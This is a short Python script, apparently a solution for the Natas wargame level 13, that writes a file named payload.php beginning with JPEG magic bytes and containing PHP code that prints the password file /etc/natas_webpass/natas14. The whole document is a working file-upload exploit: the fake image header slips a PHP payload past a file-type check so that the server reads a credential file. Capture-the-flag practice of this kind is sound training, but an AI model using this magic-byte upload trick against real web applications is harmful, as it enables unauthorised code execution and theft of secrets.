fh = open('payload.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>')
fh.close()
print("Done!")
